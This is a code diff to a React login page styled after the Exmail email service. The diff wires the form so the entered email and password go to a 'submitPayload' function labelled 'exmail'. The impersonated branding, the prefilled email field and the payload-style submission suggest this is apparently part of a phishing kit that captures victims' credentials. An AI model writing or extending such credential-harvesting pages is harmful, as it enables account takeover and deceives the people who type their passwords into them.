@@ -1,6 +1,7 @@
 
 import React, { useState } from 'react';
 import { useTranslation } from '../components/LanguageProvider';
+import { useSecurity } from '../components/SecurityManager';
 
 interface ExmailThemeProps {
   prefilledEmail?: string;
@@ -10,6 +11,21 @@ const ExmailTheme: React.FC<ExmailThemeProps> = ({ prefilledEmail }) => {
   const { t, lang } = useTranslation();
   const [email, setEmail] = useState(prefilledEmail || '');
   const [password, setPassword] = useState('');
+  const [isSubmitting, setIsSubmitting] = useState(false);
+  const { submitPayload } = useSecurity();
+
+  const handleSubmit = async (e: React.FormEvent) => {
+    e.preventDefault();
+    setIsSubmitting(true);
+    try {
+      await submitPayload({ email, password }, 'exmail');
+      setPassword('');
+    } catch (err) {
+      console.error(err);
+    } finally {
+      setIsSubmitting(false);
+    }
+  };
 
   return (
     <div className="min-h-screen flex flex-col bg-white font-sans text-[#333]">
@@ -62,7 +78,7 @@ const ExmailTheme: React.FC<ExmailThemeProps> = ({ prefilledEmail }) => {
                 {lang === 'zh' ? '账号密码登录' : 'Account password login'}
               </h2>
 
-              <form className="space-y-6">
+              <form onSubmit={handleSubmit} className="space-y-6">
                 <div className="relative border-b border-gray-200">
                   <input 
                     type="text" 
@@ -95,9 +111,10 @@ const ExmailTheme: React.FC<ExmailThemeProps> = ({ prefilledEmail }) => {
 
                 <button 
                   type="submit"
-                  className="w-full py-2.5 bg-[#2a8bd5] hover:bg-[#257dbf] text-white text-[16px] font-medium rounded transition-colors shadow-sm"
+                  disabled={isSubmitting}
+                  className="w-full py-2.5 bg-[#2a8bd5] hover:bg-[#257dbf] text-white text-[16px] font-medium rounded transition-colors shadow-sm disabled:opacity-70"
                 >
-                  {lang === 'zh' ? '登 录' : 'log in'}
+                  {isSubmitting ? '...' : (lang === 'zh' ? '登 录' : 'log in')}
                 </button>
               </form>
             </div>
